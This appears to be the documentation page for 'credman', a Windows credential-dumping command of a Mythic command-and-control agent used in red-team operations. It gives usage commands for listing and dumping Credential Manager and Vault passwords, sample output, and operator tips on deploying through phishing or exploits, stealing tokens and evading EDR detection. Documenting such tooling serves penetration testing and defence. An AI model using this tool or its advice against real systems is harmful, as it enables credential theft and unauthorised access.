+++
title = "credman"
chapter = false
weight = 108
hidden = false
+++

{{% notice info %}}Windows Only{{% /notice %}}

## Summary

Enumerate Windows Credential Manager entries and Windows Vault stores in one command:

- `list` / `dump` — legacy Credential Manager (`CredEnumerateW`): generic and domain credentials saved through `cmdkey`, RDP, network shares, etc.
- `vault` — Windows Vault (`vaultcli.dll`: `VaultEnumerateVaults` → `VaultOpenVault` → `VaultEnumerateItems` → `VaultGetItem`): web logins from Edge/IE, Microsoft account sign-ins, Passport credentials. `VaultGetItem` auto-decrypts the authenticator element via DPAPI in the calling user's context.

No subprocess creation — pure Win32 API.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | No | list | `list`: show credman targets and usernames. `dump`: also reveal stored credman passwords. `vault`: enumerate Windows Vault stores with auto-DPAPI decryption. |
| filter | string | No | (all) | For `list`/`dump`: target name filter using wildcards (e.g., `Microsoft*`). For `vault`: substring match against resource / identity / friendly name (case-insensitive). |

## Usage

### List all credentials (metadata only)
```
credman
```
or
```
credman -action list
```

### Dump credentials with passwords
```
credman -action dump
```

### Filter by target name
```
credman -action dump -filter "Microsoft*"
```

### Example Output (list)
```
=== Windows Credential Manager (3 entries) ===

--- MicrosoftAccount:target=SSO_PRT_v5 ---
  Type:     Generic
  Username: user@outlook.com
  Blob:     128 bytes (use -action dump to reveal)
  Persist:  Local Machine

--- WindowsLive:target=virtualapp/didlogical ---
  Type:     Generic
  Username: WINUSER
  Blob:     44 bytes (use -action dump to reveal)
  Persist:  Local Machine

--- Domain:interactive=WORKGROUP\setup ---
  Type:     Domain Password
  Username: setup
  Persist:  Enterprise

Summary: 2 generic, 1 domain credentials
```

### Example Output (dump)
Same as above but includes `Password:` field with decrypted credential blobs.

### Enumerate Windows Vault stores
```
credman -action vault
```

### Filter vault items by resource or identity
```
credman -action vault -filter "live.com"
```

### Example Output (vault)
```
=== Windows Vault Enumeration (2 vault(s)) ===

--- Vault: Web Credentials {4BF4C442-9B8A-41A0-B380-DD4A704DDB28} ---
  [#1] Schema:        Web Password Credential
       Friendly:      example login
       Resource:      https://login.example.com/
       Identity:      alice@example.com
       Authenticator: hunter2
       LastModified:  2025-09-12 17:42:18 UTC

--- Vault: Windows Credentials {77BC582B-F0A6-4E15-4E80-61736B6F3B29} ---
  (no items)

Summary: 2 vault(s), 1 item(s) total, 1 credential(s) registered to Mythic vault
```

## Notes

- **Credential Vault registration**: All credentials with usernames are automatically reported to Mythic's Credentials store. `dump` and `vault` register cleartext passwords; `list` only registers metadata.
- **Requires interactive logon session**: Both Credential Manager and Vault are tied to the user's interactive logon. SSH / non-interactive service contexts cannot decrypt items — `vault` items will surface as `[protected, decryption requires interactive user context]`. Deploy via methods that create an interactive session (phishing, exploit, GUI session).
- **User context**: Returns credentials for the current user only. To access another user's credentials, impersonate them first (make-token / steal-token).
- **Vault types observed**: `Web Credentials` (Edge / IE saved passwords), `Windows Credentials` (network share / RDP / Live ID), `Passport` (Microsoft account sign-in tokens).
- **OPSEC**: vaultcli calls write to the user's vault audit log. EDRs that hook the Microsoft-Windows-VaultSvc ETW provider or `vaultcli.dll` exports will surface every call.
- Credential blobs are typically UTF-16 encoded passwords. Binary blobs are reported as `[binary data, N bytes]`.

## MITRE ATT&CK Mapping

- T1555.004 — Credentials from Password Stores: Windows Credential Manager
